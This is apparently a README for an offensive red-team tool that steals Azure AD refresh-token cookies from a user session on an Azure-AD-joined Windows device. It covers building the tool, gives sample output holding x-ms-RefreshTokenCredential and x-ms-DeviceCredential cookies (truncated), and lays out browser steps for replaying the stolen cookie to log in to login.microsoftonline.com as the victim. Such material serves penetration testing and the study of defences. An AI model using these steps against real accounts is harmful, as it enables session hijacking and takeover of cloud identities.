# Overview

Obtains a refresh token for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account). An attacker can then use the token to authenticate to Azure AD as that user.

# Building

`RequestAADRefreshTokenCpp/main.cpp` can be compiled with Visual Studio or `clang`. Using [llvm-mingw](https://github.com/mstorsjo/llvm-mingw) on a Linux host, you can compile as follows:

```
~/llvm-mingw-20251202-ucrt-ubuntu-22.04-x86_64/bin/i686-w64-mingw32-clang -lole32 -s main.cpp -o requestaadrefreshtoken.exe
```

# Usage

1. Obtain access to a user context on an Azure-AD-joined device. An easy way to tell is to run the command `dsregcmd.exe /status`. If this is exploitable, there will be a section titled "SSO State" and `AzureAdPrt` will be set to YES.
2. Run RequestAADRefreshToken.exe with the login.microsoftonline.com URL with an `sso_nonce` value:

```
"requestaadrefreshtoken (1).exe" https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=wehwahwehwah
Using URI: https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=wehwahwehwah
Name: x-ms-RefreshTokenCredential
Data: eyJhbGciO...snip...; path=/; domain=login.microsoftonline.com; secure; httponly
Flags: 2040
P3PHeader: CP="CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT"

Name: x-ms-DeviceCredential
Data: eyJhbGciOiJ...snip...; path=/; domain=login.microsoftonline.com; secure; httponly
Flags: 2040
P3PHeader: CP="CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT"

x-ms-RefreshTokenCredential: eyJhbGc...snip...
x-ms-DeviceCredential: eyJhbGciOiJS...snip...
```

3. Clear your browser cookies and go to https://login.microsoftonline.com/
4. F12 (Chrome dev tools) -> Application -> Cookies
5. Delete all cookies and then add one named `x-ms-refreshtokencredential` and set its value to the JSON Web Token(JWT) in the `Data` field that RequestAADRefreshToken.exe output
6. Refresh the page (or visit https://login.microsoftonline.com/login.srf again) and you'll be logged it


# References

* https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token#how-are-app-tokens-and-browser-cookies-protected
* https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token#browser-sso-using-prt
* https://docs.microsoft.com/en-us/azure/active-directory/devices/troubleshoot-device-dsregcmd#sso-state
